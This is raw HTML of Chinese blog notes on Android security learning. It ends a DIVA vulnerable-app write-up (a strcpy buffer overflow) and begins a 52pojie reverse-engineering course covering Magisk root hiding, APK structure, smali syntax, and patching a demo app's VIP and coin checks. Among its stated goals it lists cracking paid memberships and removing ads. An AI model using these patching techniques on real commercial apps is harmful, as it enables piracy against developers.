<span class="built_in">this</span>.djni = <span class="keyword">new</span> <span class="title class_">DivaJni</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>djni</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DivaJni</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">soName</span> <span class="operator">=</span> <span class="string">&quot;divajni&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;divajni&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">access</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">initiateLaunchSequence</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>System.loadLibrary(“divajni”)加载了divajni库，一般库文件都放在&#x2F;lib下，在目录下找到libdivajni.so文件，linux下可以使用strings方便的查看二进制文件里的字符串。</p>
<p>olsdfgad;lh</p>
<h2 id="输入校验问题—第三部分"><a href="#输入校验问题—第三部分" class="headerlink" title="输入校验问题—第三部分"></a>输入校验问题—第三部分</h2><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InputValidation3Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> DivaJni djni;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040022</span>);  <span class="comment">// layout:activity_input_validation3</span></span><br><span class="line">        <span class="built_in">this</span>.djni = <span class="keyword">new</span> <span class="title class_">DivaJni</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">cTxt</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0085</span>);  <span class="comment">// id:ivi3CodeText</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.djni.initiateLaunchSequence(cTxt.getText().toString()) != <span class="number">0</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Launching in T - 10 ...&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access denied!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>djni</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DivaJni</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">soName</span> <span class="operator">=</span> <span class="string">&quot;divajni&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;divajni&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">access</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">initiateLaunchSequence</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当输入超级多的数据时，程序崩溃了</p>
<p>查看logcat可以发现缓冲区溢出了</p>
<p>可以看到这里使用的是strcpy，使用strcpy_s更加安全</p>
<h2 id="drozer"><a href="#drozer" class="headerlink" title="drozer"></a>drozer</h2><p><a href="https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf">mwri (withsecure.com)</a></p>
<p><a href="https://blog.csdn.net/jianglianye21/article/details/80667346">drozer-Android安全测试基本使用教程（Windows10）_drozer官网_一世繁华行的博客-CSDN博客</a></p>
<p><a href="https://www.jianshu.com/p/dfa92bab3a55">Android安全测试框架Drozer（使用篇） - 简书 (jianshu.com)</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>知道怎么配ADB、以及安卓有哪些漏洞有了更深的了解、以及安卓信息保存、处理输入逻辑等有了更深的了解。</p>
<p>以后有需要再继续深入学习安卓。</p>
]]></content>
      <tags>
        <tag>Android_security</tag>
      </tags>
  </entry>
  <entry>
    <title>android_study_吴爱破解</title>
    <url>/2023/03/18/android-study/</url>
    <content><![CDATA[<p><a href="https://www.52pojie.cn/thread-648530-1-1.html">《教我兄弟学Android逆向01 编写第一个Android程序》 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://www.52pojie.cn/thread-1695141-1-1.html">https://www.52pojie.cn/thread-1695141-1-1.html</a></p>
<p><a href="https://www.runoob.com/w3cnote/android-tutorial-intro.html">1.0 Android基础入门教程 | 菜鸟教程 (runoob.com)</a></p>
<h2 id="模拟器环境搭建"><a href="#模拟器环境搭建" class="headerlink" title="模拟器环境搭建"></a>模拟器环境搭建</h2><h3 id="什么是安卓逆向？"><a href="#什么是安卓逆向？" class="headerlink" title="什么是安卓逆向？"></a>什么是安卓逆向？</h3><p>安卓逆向是对已经打包好的APP进行反编译、源码分析了解APP实现逻辑的一门技术</p>
<h3 id="安卓逆向可以干嘛？"><a href="#安卓逆向可以干嘛？" class="headerlink" title="安卓逆向可以干嘛？"></a>安卓逆向可以干嘛？</h3><p>去更新<br>去广告<br>内购&#x2F;会员破解<br>协议自动签到<br>白嫖！！！</p>
<h3 id="Magisk介绍"><a href="#Magisk介绍" class="headerlink" title="Magisk介绍"></a>Magisk介绍</h3><p>参考链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://sspai.com/post/67932</span><br><span class="line">https://magiskcn.com/</span><br><span class="line">https://www.52pojie.cn/thread-1583586-1-1.html</span><br><span class="line">https://magiskcn.com/lsposed-instal</span><br></pre></td></tr></table></figure>

<p>Magisk 是一套用于定制 Android 的开源软件，支持高于 Android 5.0 的设备。</p>
<p>以下是一些功能亮点：</p>
<ul>
<li><strong>MagiskSU</strong>：为应用程序提供 root 访问权限</li>
<li><strong>Magisk 模块</strong>：通过安装模块修改只读分区</li>
<li><strong>MagiskHide</strong>：从根检测 &#x2F; 系统完整性检查中隐藏 Magisk(Shamiko)</li>
<li><strong>MagiskBoot</strong> : 最完整的安卓启动镜像解包和重新打包工具</li>
</ul>
<h3 id="学习环境搭建"><a href="#学习环境搭建" class="headerlink" title="学习环境搭建"></a>学习环境搭建</h3><ul>
<li>下载雷电模拟器，开启root权限以及System.vmdk可写入</li>
<li>拖进面具安装，安装至系统分区，出现ALL DONE安装成功</li>
<li>安装lsposed模块</li>
</ul>
<h2 id="APK文件结构、双开、汉化、基础修改"><a href="#APK文件结构、双开、汉化、基础修改" class="headerlink" title="APK文件结构、双开、汉化、基础修改"></a>APK文件结构、双开、汉化、基础修改</h2><p>工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">教程Demo</span><br><span class="line">MT管理器/NP管理器</span><br><span class="line">开发者助手</span><br><span class="line">雷电模拟器</span><br><span class="line">核心破解器（可以按照相同包名不同签名</span><br></pre></td></tr></table></figure>

<h3 id="Apk结构"><a href="#Apk结构" class="headerlink" title="Apk结构"></a>Apk结构</h3><p>apk 全称 Android Package，它相当于一个压缩文件，只要在电脑上将apk后缀改为zip即可解压。</p>
<p>解压后：</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230318203435733.png" alt="image-20230318203435733" style="zoom:25%;" />



<table>
<thead>
<tr>
<th align="center">文件</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">assets目录</td>
<td align="center">存放APK的静态资源文件，比如视频，音频，图片等</td>
</tr>
<tr>
<td align="center">lib 目录</td>
<td align="center">armeabi-v7a基本通用所有android设备，arm64-v8a只适用于64位的android设备，x86常见用于android模拟器，其目录下的.so文件是c或c++编译的动态链接库文件</td>
</tr>
<tr>
<td align="center">META-INF目录</td>
<td align="center">保存应用的签名信息，签名信息可以验证APK文件的完整性，相当于APK的身份证(验证文件是否又被修改)</td>
</tr>
<tr>
<td align="center">res目录</td>
<td align="center">res目录存放资源文件，包括图片，字符串等等，APK的脸蛋由他的layout文件设计</td>
</tr>
<tr>
<td align="center">AndroidMainfest.xml文件</td>
<td align="center">APK的应用清单信息，它描述了应用的名字，版本，权限，引用的库文件等等信息</td>
</tr>
<tr>
<td align="center">classes.dex文件</td>
<td align="center">classes.dex是java源码编译后生成的java字节码文件，APK运行的主要逻辑</td>
</tr>
<tr>
<td align="center">resources.arsc文件</td>
<td align="center">resources.arsc是编译后的二进制资源文件，它是一个映射表，映射着资源和id，通过R文件中的id就可以找到对应的资源</td>
</tr>
</tbody></table>
<h3 id="双开及原理"><a href="#双开及原理" class="headerlink" title="双开及原理"></a>双开及原理</h3><p>双开：简单来说，就是手机同时运行两个或多个相同的应用</p>
<p>可以直接使用MT管理器修改包名</p>
<table>
<thead>
<tr>
<th align="center">原理</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">修改包名</td>
<td align="center">让手机系统认为这是2个APP，这样的话就能生成2个数据存储路径，此时的多开就等于你打开了两个互不干扰的APP</td>
</tr>
<tr>
<td align="center">修改Framework</td>
<td align="center">对于有系统修改权限的厂商，可以修改Framework来实现双开的目的，例如：小米自带多开</td>
</tr>
<tr>
<td align="center">通过虚拟化技术实现</td>
<td align="center">虚拟Framework层、虚拟文件系统、模拟Android对组件的管理、虚拟应用进程管理 等一整套虚拟技术，将APK复制一份到虚拟空间中运行，例如：平行空间</td>
</tr>
<tr>
<td align="center">以插件机制运行</td>
<td align="center">利用反射替换，动态代{过}{滤}理，hook了系统的大部分与system—server进程通讯的函数，以此作为“欺上瞒下”的目的，欺骗系统“以为”只有一个apk在运行，瞒过插件让其“认为”自己已经安装。例如：VirtualApp</td>
</tr>
</tbody></table>
<h3 id="汉化APK"><a href="#汉化APK" class="headerlink" title="汉化APK"></a>汉化APK</h3><p>汉化：使用专门的工具对外文版的软件资源进行读取、翻译、修改、回写等一系列处理，使软件的菜单、对话框、提示等用户界面显示为中文，而程序的内核和功能保持不变，这个过程即为软件汉化</p>
<h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">定义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">versionCode</td>
<td align="center">版本号，主要用来更新，例如:12</td>
</tr>
<tr>
<td align="center">versionName</td>
<td align="center">版本名，给用户看的，例如:1.2</td>
</tr>
<tr>
<td align="center">package</td>
<td align="center">包名，例如：com.zj.52pj.demo</td>
</tr>
<tr>
<td align="center">uses-permission android:name&#x3D;””</td>
<td align="center">应用权限，例如：android.permission.INTERNET 代表网络权限</td>
</tr>
<tr>
<td align="center">android:label&#x3D;”@string&#x2F;app_name”</td>
<td align="center">应用名称</td>
</tr>
<tr>
<td align="center">android:icon&#x3D;”@mipmap&#x2F;ic_launcher”</td>
<td align="center">应用图标路径</td>
</tr>
<tr>
<td align="center">android:debuggable&#x3D;”true”</td>
<td align="center">应用是否开启debug权限</td>
</tr>
</tbody></table>
<h3 id="eg"><a href="#eg" class="headerlink" title="eg:"></a>eg:</h3><p><a href="https://www.bilibili.com/video/BV1UV411i7sG/">超详细MT管理器改包教程：教你修改包名、名称、版本、图标_哔哩哔哩_bilibili</a></p>
<p>应用双开</p>
<p>修改名字:<a href="https://www.cnblogs.com/wxy13644813114/p/13608281.html">转载-mt管理器修改软件名称（第二课） - 王啸岩 - 博客园 (cnblogs.com)</a></p>
<p>找个英文应用汉化</p>
<p>替换应用的图片：在res中找文件</p>
<h2 id="初识smali，vip终结者"><a href="#初识smali，vip终结者" class="headerlink" title="初识smali，vip终结者"></a>初识smali，vip终结者</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>了解JVM、Dalvik、ART<br>初识smali语法<br>实战修改smali</p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>教程Demo(更新)<br>MT管理器&#x2F;NP管理器<br>雷电模拟器<br>jadx-gui（开源反编译工具<br>核心破解（解决签名问题</p>
<p>smail语法查询</p>
<h3 id="JVM、Dalvik、ART"><a href="#JVM、Dalvik、ART" class="headerlink" title="JVM、Dalvik、ART"></a>JVM、Dalvik、ART</h3><p>JVM是JAVA虚拟机，运行JAVA字节码程序<br>Dalvik是Google专门为Android设计的一个虚拟机，Dalvik有专属的文件执行格式dex(Dalvik executable)<br>Art(Android Runtime)相当于Dalvik的升级版，本质与Dalvik无异</p>
<h3 id="smali及其语法"><a href="#smali及其语法" class="headerlink" title="smali及其语法"></a>smali及其语法</h3><p>参考：</p>
<p><a href="https://blog.csdn.net/lixpjita39/article/details/75193833">Android逆向世界之一:smali文件_smail_逆风Lee的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/l_o_s/article/details/79305253">Smali基本语法(一)_smali注释_岳锋的博客-CSDN博客</a></p>
<p><a href="https://www.chieng.cn/post/169.html">smali语法详解（逆向安卓必学）_文摘_Chieng个人博客</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/379336005">Smali基本语法与指令 - 知乎 (zhihu.com)</a></p>
<p><a href="https://blog.csdn.net/Rozol/article/details/88368358">https://blog.csdn.net/Rozol/article/details/88368358</a></p>
<h4 id="smali文件的结构"><a href="#smali文件的结构" class="headerlink" title="smali文件的结构"></a>smali文件的结构</h4><h5 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.class &lt;访问权限修饰符&gt; [非权限修饰符] &lt;类名&gt;</span><br><span class="line">.<span class="built_in">super</span> &lt;父类名&gt;</span><br><span class="line">.source &lt;源文件名称&gt;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.class public final Llutey/FTPServer/preferences/PreferencesFactory;</span><br><span class="line">.super Ljava/lang/Object;</span><br><span class="line">.source &quot;PreferencesFactory.java&quot;</span><br></pre></td></tr></table></figure>

<h5 id="接口实现"><a href="#接口实现" class="headerlink" title="接口实现"></a>接口实现</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#interfaces</span><br><span class="line">.implements &lt;接口名称&gt;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># interfaces</span><br><span class="line">.implements Landroid/view/View$OnClickListener;</span><br></pre></td></tr></table></figure>

<h5 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#annotations</span><br><span class="line">.annotation [注解的属性] &lt;注解类名&gt;</span><br><span class="line">    [注解字段=值]</span><br><span class="line">    ...</span><br><span class="line">.end annotation</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># annotations</span><br><span class="line">.annotation build Landroid/annotation/TargetApi;</span><br><span class="line">    value = 0xb</span><br><span class="line">.end annotation</span><br></pre></td></tr></table></figure>

<h5 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h5><p>使用.field描述字段的定义，分为静态变量和普通变量两种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#static fields</span><br><span class="line">.field &lt;访问权限&gt; static [修饰词] &lt;字段名&gt;:&lt;变量类型&gt;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># static fields</span><br><span class="line">.field public static mStr:Ljava/lang/String;</span><br></pre></td></tr></table></figure>



<h4 id="常用指令1"><a href="#常用指令1" class="headerlink" title="常用指令1"></a>常用指令1</h4><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.class</td>
<td align="center">类名</td>
</tr>
<tr>
<td align="center">.super</td>
<td align="center">父类名，继承的上级类名名称</td>
</tr>
<tr>
<td align="center">.source</td>
<td align="center">源名</td>
</tr>
<tr>
<td align="center">.field</td>
<td align="center">变量</td>
</tr>
<tr>
<td align="center">.method</td>
<td align="center">方法名</td>
</tr>
<tr>
<td align="center">.register</td>
<td align="center">寄存器</td>
</tr>
<tr>
<td align="center">.end method</td>
<td align="center">方法名的结束</td>
</tr>
<tr>
<td align="center">public</td>
<td align="center">公有</td>
</tr>
<tr>
<td align="center">protected</td>
<td align="center">半公开，只有同一家人才能用</td>
</tr>
<tr>
<td align="center">private</td>
<td align="center">私有，只能自己使用</td>
</tr>
<tr>
<td align="center">.parameter</td>
<td align="center">方法参数</td>
</tr>
<tr>
<td align="center">.prologue</td>
<td align="center">方法开始</td>
</tr>
<tr>
<td align="center">.line xxx</td>
<td align="center">位于第xxx行</td>
</tr>
<tr>
<td align="center">.annotation&#x2F;.end annotation</td>
<td align="center"></td>
</tr>
</tbody></table>
<h4 id="数据类型对应"><a href="#数据类型对应" class="headerlink" title="数据类型对应"></a>数据类型对应</h4><table>
<thead>
<tr>
<th align="center">smali类型</th>
<th align="center">java类型</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">V</td>
<td align="center">void</td>
<td align="center">无返回值</td>
</tr>
<tr>
<td align="center">Z</td>
<td align="center">boolean</td>
<td align="center">布尔值类型，返回0或1</td>
</tr>
<tr>
<td align="center">B</td>
<td align="center">byte</td>
<td align="center">字节类型，返回字节</td>
</tr>
<tr>
<td align="center">S</td>
<td align="center">short</td>
<td align="center">短整数类型，返回数字</td>
</tr>
<tr>
<td align="center">C</td>
<td align="center">char</td>
<td align="center">字符类型，返回字符</td>
</tr>
<tr>
<td align="center">I</td>
<td align="center">int</td>
<td align="center">整数类型，返回数字</td>
</tr>
<tr>
<td align="center">J</td>
<td align="center">long （64位 需要2个寄存器存储）</td>
<td align="center">长整数类型，返回数字</td>
</tr>
<tr>
<td align="center">F</td>
<td align="center">float</td>
<td align="center">单浮点类型，返回数字</td>
</tr>
<tr>
<td align="center">D</td>
<td align="center">double （64位 需要2个寄存器存储）</td>
<td align="center">双浮点类型，返回数字</td>
</tr>
<tr>
<td align="center">string</td>
<td align="center">String</td>
<td align="center">文本类型，返回字符串</td>
</tr>
<tr>
<td align="center">Lxxx&#x2F;xxx&#x2F;xxx</td>
<td align="center">object</td>
<td align="center">对象类型，返回对象</td>
</tr>
</tbody></table>
<h4 id="常用指令2"><a href="#常用指令2" class="headerlink" title="常用指令2"></a>常用指令2</h4><table>
<thead>
<tr>
<th align="center">关键字</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">const</td>
<td align="center">重写整数属性，真假属性内容，只能是数字类型</td>
</tr>
<tr>
<td align="center">const-string</td>
<td align="center">重写字符串内容</td>
</tr>
<tr>
<td align="center">const-wide</td>
<td align="center">重写长整数类型，多用于修改到期时间。</td>
</tr>
<tr>
<td align="center">return</td>
<td align="center">返回指令</td>
</tr>
<tr>
<td align="center">if-eq</td>
<td align="center">全称equal(a&#x3D;b)，比较寄存器ab内容，相同则跳</td>
</tr>
<tr>
<td align="center">if-ne</td>
<td align="center">全称not equal(a!&#x3D;b)，ab内容不相同则跳</td>
</tr>
<tr>
<td align="center">if-eqz</td>
<td align="center">全称equal zero(a&#x3D;0)，z即是0的标记，a等于0则跳</td>
</tr>
<tr>
<td align="center">if-nez</td>
<td align="center">全称not equal zero(a!&#x3D;0)，a不等于0则跳</td>
</tr>
<tr>
<td align="center">if-ge</td>
<td align="center">全称greater equal(a&gt;&#x3D;b)，a大于或等于则跳</td>
</tr>
<tr>
<td align="center">if-le</td>
<td align="center">全称little equal(a&lt;&#x3D;b)，a小于或等于则跳</td>
</tr>
<tr>
<td align="center">goto</td>
<td align="center">强制跳到指定位置</td>
</tr>
<tr>
<td align="center">switch</td>
<td align="center">分支跳转，一般会有多个分支线，并根据指令跳转到适当位置</td>
</tr>
<tr>
<td align="center">iget</td>
<td align="center">获取寄存器数据</td>
</tr>
</tbody></table>
<h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器:"></a>寄存器:</h4><p>在smali里的所有操作都必须经过寄存器来进行:本地寄存器用v开头数字结尾的符号来表示，如v0、 v1、v2。 参数寄存器则使用p开头数字结尾的符号来表示，如p0、p1、p2。特别注意的是，p0不一定是函数中的第一个参数，在非static函数中，p0代指“this”，p1表示函数的第一个 参数，p2代表函数中的第二个参数。而在static函数中p0才对应第一个参数(因为Java的static方法中没有this方法）</p>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>本次学习使用的demo为修改一app使其能够一来就有大会员。</p>
<h4 id="jadx-gui寻找目标位置"><a href="#jadx-gui寻找目标位置" class="headerlink" title="jadx-gui寻找目标位置"></a>jadx-gui寻找目标位置</h4><p>打开文件</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230319110933178.png" alt="image-20230319110933178" style="zoom:67%;" />

<p>jadx-gui搜索关键字符串：大会员</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230319111126434.png" alt="image-20230319111126434" style="zoom:50%;" />

<p>找到对应位置了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//一个私有、静态、不可变的方法   方法名</span><br><span class="line">.method private static final onCreate$lambda-2(Lkotlin/jvm/internal/Ref$IntRef;Lcom/zj/wuaipojie/ui/ChallengeSecond;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/view/View;)Z //(这里面是方法的参数)这里是方法返回值类型，表示布尔值类型，返回假或真</span><br><span class="line">    .registers 7  //寄存器数量</span><br><span class="line"></span><br><span class="line">    .line 33  //代码所在的行数</span><br><span class="line">    iget p0, p0, Lkotlin/jvm/internal/Ref$IntRef;-&gt;element:I  //读取p0(第一个参数，参考寄存器知识)中element的值赋值给p0</span><br><span class="line"></span><br><span class="line">    const/4 p5, 0x1  //p5赋值1</span><br><span class="line"></span><br><span class="line">    const/16 v0, 0xa //v0赋值10，在16进制里a表示10</span><br><span class="line"></span><br><span class="line">    if-ge p0, v0, :cond_15  //判断p0的值是否大于或等于v0的值(即p0的值是否大于或等于10)，如果大于或等于则跳转到:cond_15</span><br><span class="line"></span><br><span class="line">    .line 34  //以下是常见的Toast弹窗代码</span><br><span class="line">    check-cast p1, Landroid/content/Context; //检查Context对象引用</span><br><span class="line"></span><br><span class="line">    const-string p0, &quot;请先获取10个硬币哦&quot; //弹窗文本信息，把&quot;&quot;里的字符串数据赋值给p0</span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence; //检查CharSequence对象引用</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast; </span><br><span class="line">    //将弹窗文本、显示时间等信息传给p1</span><br><span class="line"></span><br><span class="line">    move-result-object p0  //结果传递给p0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V  //当看到这个Toast;-&gt;show你就应该反应过来这里是弹窗代码</span><br><span class="line"></span><br><span class="line">    goto :goto_31  //跳转到:goto_31</span><br><span class="line"></span><br><span class="line">    :cond_15 //跳转的一个地址</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p1&#125;, Lcom/zj/wuaipojie/ui/ChallengeSecond;-&gt;isvip()Z  //判断isvip方法的返回值是否为真(即结果是否为1)</span><br><span class="line"></span><br><span class="line">    move-result p0  //结果赋值给p0</span><br><span class="line"></span><br><span class="line">    if-eqz p0, :cond_43 //如果结果为0则跳转cond_43地址</span><br><span class="line"></span><br><span class="line">    const p0, 0x7f0d0018  //在arsc中的id索引，这个值可以进行查询</span><br><span class="line"></span><br><span class="line">    .line 37</span><br><span class="line">    invoke-virtual &#123;p2, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V //设置图片资源</span><br><span class="line"></span><br><span class="line">    const p0, 0x7f0d0008</span><br><span class="line"></span><br><span class="line">    .line 38</span><br><span class="line">    invoke-virtual &#123;p3, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    const p0, 0x7f0d000a</span><br><span class="line"></span><br><span class="line">    .line 39</span><br><span class="line">    invoke-virtual &#123;p4, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    .line 40</span><br><span class="line">    sget-object p0, Lcom/zj/wuaipojie/util/SPUtils;-&gt;INSTANCE:Lcom/zj/wuaipojie/util/SPUtils; </span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    const/4 p2, 0x2 //p2赋值2</span><br><span class="line"></span><br><span class="line">    const-string p3, &quot;level&quot; //sp的索引</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0, p1, p3, p2&#125;, Lcom/zj/wuaipojie/util/SPUtils;-&gt;saveInt(Landroid/content/Context;Ljava/lang/String;I)V //写入数据</span><br><span class="line"></span><br><span class="line">    goto :goto_50 //跳转地址</span><br><span class="line"></span><br><span class="line">    :cond_43</span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    const-string p0, &quot;\u8bf7\u5148\u5145\u503c\u5927\u4f1a\u5458\u54e6\uff01&quot; //请先充值大会员哦！</span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence;</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object p0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    :goto_50</span><br><span class="line">    return p5  //返回p5的值</span><br><span class="line">.end method //方法结束</span><br><span class="line"></span><br><span class="line">//判断是否是大会员的方法</span><br><span class="line">.method public final isvip()Z</span><br><span class="line">    .registers 2</span><br><span class="line"></span><br><span class="line">    const/4 v0, 0x0 //v0赋值0</span><br><span class="line"></span><br><span class="line">    return v0 //返回v0的值</span><br><span class="line"></span><br><span class="line">.end method</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主要有两个判断一个硬币判断一个大会员判断，直接改就是了</p>
<p>修改方法：修改判断、强制跳转、修改寄存器的值</p>
<h2 id="恭喜你获得广告-amp-弹窗静默卡"><a href="#恭喜你获得广告-amp-弹窗静默卡" class="headerlink" title="恭喜你获得广告&amp;弹窗静默卡"></a>恭喜你获得广告&amp;弹窗静默卡</h2><h3 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h3><p>1.了解安卓四大组件、Activity生命周期<br>2.弹窗定位、去更新<br>3.广告分析与布局优化</p>
<h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><p>1.教程Demo(更新)<br>2.MT管理器&#x2F;NP管理器:activity记录<br>3.算法助手：hook弹窗<br>4.雷电模拟器<br>5.开发助手</p>
<h3 id="广告类型"><a href="#广告类型" class="headerlink" title="广告类型"></a>广告类型</h3><p>启动广告   弹窗&amp;更新广告  横幅广告</p>
<h3 id="安卓四大组件"><a href="#安卓四大组件" class="headerlink" title="安卓四大组件"></a>安卓四大组件</h3><table>
<thead>
<tr>
<th align="center">组件</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Activity(活动)</td>
